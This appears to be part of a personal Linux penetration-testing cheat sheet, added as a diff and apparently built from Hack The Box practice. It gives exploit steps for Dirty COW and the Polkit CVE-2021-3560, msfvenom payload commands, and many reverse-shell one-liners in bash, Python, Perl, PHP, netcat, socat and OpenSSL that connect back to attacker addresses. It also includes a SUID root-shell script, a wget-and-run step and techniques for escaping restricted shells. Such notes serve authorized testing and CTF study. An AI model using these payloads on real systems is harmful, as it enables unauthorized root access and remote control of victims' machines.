+			Basics:
+				Linux Kernel 2.6.22 < 3.9
+				Note:
+					Dirtycow exploit should be used as the last resort as it can crash victim's system.
+			Exploitation:(https://github.com/dirtycow/dirtycow.github.io)
+				gcc -pthread dirty.c -o dirty -lcrypt
+				Note:
+					Read C For Pentesing Sheet to read about gcc.
+		CVE-2021-3560:(Polkit service Exploitation)
+			Basics:
+				Polkit is a system service installed by default on many Linux distributions
+				The vulnerability enables an unprivileged local user to get a root shell on the system.
+			Enumeration:
+				Vulnerable versions:(uname -a)
+					RHEL 8
+					Fedora 21
+					Debain testing (bullseye)
+					ubuntu 20.04
+			Exploitation:
+				CVE-2021-3560:(https://github.com/deathflash1411/CVE-2021-3560)
+					Usage:
+						python3 CVE-2021-3560.py => this will create a user "flash:flash" and give a COMMAND
+						run the COMMAND 
+						su - flash => enter password (flash)
+						sudo -i => got root	
+File Transfers:
+	Upload:
+		python3 -m http.server 80
+		python3 -m http.server 80 --dir /home/kali/tools
+		python2 -m SimpleHTTPServer 80
+			note: python2 support is discontinued in kali 2020.1
+	Download:
+		wget
+		axel
+		curl
+		scp:(secure copy)
+			can only be used if SSH is enabled.
+			scp file.ext user@pass:/home/abcd/
+	Both Upload and Download:
+		netcat:
+			Read Exploitation sheet for this
+		base64/32 encode:
+			We can also use base64/base32 encode and decode functions to transfer files
+	Best place to download a file:
+		/tmp
+		/dev/shm
+		/var/tmp
+Linux Payloads and reverse shell:
+	ELF:
+		command based:
+			msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf > shell-x86.elf
+		Stageless:
+			msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+			msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+		Staged:
+			msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+			msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+		Note:
+			Read Linux Internals Sheet to read about ELF.
+	SH:(Shell Script)
+		msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+		shell1.sh:
+			#!/bin/bash
+			cp /bin/bash /tmp/rootbash
+			chmod +xs /tmp/rootbash
+			Note:
+				After running it:
+					$ /tmp/rootbash -p
+		shell2.sh:
+			#!/bin/bash
+			bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+		Note:
+			Read Linux Shell Scripting and One-Liners Sheet to read about shell scripts.
+	Python:
+		Python2:
+		Python3:
+			shell1.py:
+				import socket,subprocess,os
+				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+				s.connect((“10.10.14.10”,4444))
+				os.dup2(s.fileno(),0)
+				os.dup2(s.fileno(),1)
+				os.dup2(s.fileno(),2)
+				p=subprocess.call([“/bin/sh”,”-i”])
+	Binary:
+		Binary-1:
+			echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/shell.c
+		Compiling the Binary:
+			Read C For Pentesing Sheet.
+	OpenSSL:(used in HTB::lightweight)
+		kali> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes => generate keys
+		kali> openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT> => attacker
+		victim> mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s
+		Note:
+			Read Password Cracking & Cryptography Sheet to read about OpenSSL.
+Getting a TTY Shell:(3 Steps)
+	Step-1: Spawning a PTY
+		A. One-Liners:
+			1. Language One-liners:
+				Python:
+					python -c 'import pty; pty.spawn("/bin/sh")'
+					python -c 'import pty; pty.spawn("/bin/bash")'
+				Python3:
+					python3 -c 'import pty; pty.spawn("/bin/sh")'
+					python3 -c 'import pty; pty.spawn("/bin/bash")'
+				Echo:
+					echo os.system('/bin/sh')
+					echo os.system('/bin/bash')
+				Perl:
+					perl -e 'exec "/bin/sh";'
+					perl -e 'exec "/bin/bash";'
+			2. Shell:
+				/bin/sh -i
+				/bin/bash -i
+			3. From inside of an Interpreter/Editor/Compiler:
+				vi:($ vi)
+					:!bash
+					:!sh
+					:set shell=/bin/bash:shell
+					:set shell=/bin/sh:shell
+				irb:($ irb)
+					exec “/bin/sh”
+					exec “/bin/bash”
+				perl:($ perl)
+					exec "/bin/sh";
+					exec "/bin/bash";
+				ruby:($ ruby)
+					exec "/bin/sh";
+					exec "/bin/bash";
+				lua:($ lua)
+					os.execute('/bin/sh')
+					os.execute('/bin/bash')
+		B. Spawning a TTY Shell from a Non-TTY Shell:
+			1. Using socat:
+				Kali> socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
+				Victim> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:kali_ip:443
+					Note:
+						To transfer socat to victim:(https://github.com/andrew-d/static-binaries)
+							wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:kali_ip:443
+			2. Using netcat:
+				Kali> nc -nvlp 443
+				Victim> nc -e /bin/sh kali_ip 443
+			3. Using python:(works)
+				Kali> nc -nvlp 443
+				Victim> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kali_ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+			4. Using python3:(works)
+				Kali> nc -nvlp 443
+				Victim> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kali_ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+			5. Using perl:
+				Kali> nc -nvlp 443
+				Victim> perl -e 'use Socket;$i="ip";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+	Step-2: Resizing and tab completion
+		1. CTRL+Z => Background your reverse shell
+		2. stty raw -echo; fg<enter><enter> => Bring the reverse shell back to foreground
+		3. reset => type it(we may not be able to see what we type) and then press [ENTER]
+		4. stty rows 24 cols 80
+			set according to my terminal(Terminal -> Preferences -> Profiles -> Unamed -> Text)
+	Step-3: Adding Color
+		kali> echo $TERM
+		shell> export TERM=xterm-256color
+			set according to my terminal
+	Special Case:
+		Sometimes to gain a TTY Shell, we have to gain shell_2 from shell_1(Read "Spawning a TTY Shell from a Non-TTY Shell" Section above) and then use Language based one-liners to gain TTY.
+Escape from Restricted Shells:(HTB::Solidstate)
+	Basics:
+		Restricted shell is also known as rbash.
+		Usually, the following is restricted in a Restricted Shell:
+			Commands like cd/ls/echo
+			Output redirection using the >, >|, ", >&, &>, and >> operators
+			Languages like python/ruby/perl/etc
+			Setting or unsetting environment variables.
+			Commands that contain slashes.
+			Importing function definitions from the shell environment at startup.
+			Parsing the value of SHELLOPTS from the shell environment at startup.
+			Using -exec built-in to replace the shell with another command.
+			Adding or deleting built-in commands with the -f and -d options to the enable built-in.
+			Using the enable built-in command to enable disabled shell built-ins.
+			Specifying the -p option to the command built-in.
+			Turning off restricted mode with set +r or set +o restricted.
+	Enumeration:
+		Finding what type of Shell we are in:
+			env
+			echo $SHELL
+			echo $PATH
+			echo $0
+	Escaping Shell:
+		A. If we are in shell:
+			1. Try to run these:
+				/bin/sh
+				/bin/bash
+			2. Editing writable environment variable:
+				export -p => shows environment variable along with permissions
+				If any of them is writable, set that variable of /bin/bash or /bin/sh:
+					export var_name=/bin:/usr/bin:/sbin:$PATH
+			3. What commands can we run as root:
+				sudo -l
+			4. via text editors:(just type as i have mentioned and then press enter)
+				via ed:
+					!'/bin/sh'
+				via vi/vim:
+					bypass-1:
+						:set shell=/bin/sh
+						:shell
+					bypass-2:
+						:! /bin/sh
+					bypass-3:
+						:! /bin/bash
+				via nano:
+					^R^X
+					reset; sh 1>&0 2>&0
+			5. via reverse shell:
+				php:
+					victim>php -r '$sock=fsockopen("ip-address",port);exec("/bin/bash -i <&3 >&3 2>&3");'
+				python:
+					victim>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+				nc:
+					victim>nc  ip-address port-number -e /bin/bash
+			6. via programming languages:
+				using python2/3:
+					python2:
+						python -c 'import os; os.system("/bin/bash");'
+					python3:
+						python3 -c 'import os; os.system("/bin/bash");'
+				using perl:
+					1. perl -e 'system("/bin/bash");'
+					2. perl
+					   >exec "/bin/sh";
+				using php:
+					php -a
+					>exec("sh -i");
+				using ruby:
+					ruby
+					>exec "/bin/sh"
+				using expect:(unix programming language, present by default)
+					expect
+					>spawn sh
+			7. Using system binaries:
+				via /bin/more:
+					create a file and type either on these in it:
+						1. !’sh’
+						2. '! /bin/sh'
+						3. '!/bin/sh'
+						4. '!bash'
+					more file_name
+				via /bin/less:
+					create a file and type either on these in it:
+						1. !’sh’
+						2. '! /bin/sh'
+						3. '!/bin/sh'
+						4. '!bash'
+					less file_name
+				via awk:
+					1. awk 'BEGIN {system("/bin/bash")}'
+					2. awk 'BEGIN {system("/bin/sh")}'
+				via find:
+					1. find . -name test.php -exec awk 'BEGIN {system("/bin/bash")}' \;
+					2. find . -name test.php -exec awk 'BEGIN {system("/bin/sh")}' \;
+					3. find / -name someName -exec /bin/sh ;
+					4. find / -name someName -exec /bin/bash ;
+				via tar:
+					tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
+				via zip:
+					zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"			
+		B. If we are not in shell:
+			via ssh:
+				1.ssh user@ip -t "bash --noprofile"
+				2.ssh user@ip -t "/bin/sh"
+				3.ssh user@ip -t "/bin/bash"
+				4.ssh user@ip bash
+Note:
+	When shifting from lower shell to higher shell:
+		If ssh doesnt work:
+			lower_shell> su root
